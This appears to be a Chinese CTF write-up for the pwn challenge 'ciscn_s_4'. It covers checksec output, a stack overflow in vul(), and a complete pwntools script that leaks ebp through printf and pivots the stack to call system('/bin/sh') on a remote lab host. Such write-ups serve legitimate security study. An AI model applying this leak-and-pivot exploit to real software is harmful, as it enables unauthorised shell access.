```
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

程序 vuln() 存在栈溢出：

```c
int vul()
{
  char s[40]; // [esp+0h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  read(0, s, 48u);
  printf("Hello, %s\n", s);
  read(0, s, 0x30u);
  return printf("Hello, %s\n", s);
}
```

程序有 `system` 无 `/bin/sh`。

第一次 `printf` 可以泄漏 ebp address，从而推断出 s 的起始地址，观察到 vul() 栈溢出之后函数直接返回，可以控制返回地址为 `leave;ret` 做栈迁移。

```py
from pwn import *
from sys import argv

leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

proc = "./ciscn_s_4"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
io = remote("node5.buuoj.cn", 26439) if argv[1] == 'r' else process(proc)

if args.G:
	gdb.attach(io)

payload1 = b'a' * 36 + b'bbbb'
io.send(payload1)
io.recvuntil(b'bbbb', drop=True)
s_addr = u32(io.recv(4)) - 0x38
leak("s_addr", s_addr)

system_addr = 0x8048400
binsh_addr = s_addr + 12
leave_ret = 0x08048562

payload2 = p32(system_addr) + b'dead' + p32(binsh_addr) + b"/bin/sh\x00"
payload2 += b'c' * (40 - len(payload2))
payload2 += p32(s_addr - 4)
payload2 += p32(leave_ret)
io.sendline(payload2)

itr()

```

考点：printf 不截断导致泄漏、栈溢出、[[栈迁移]]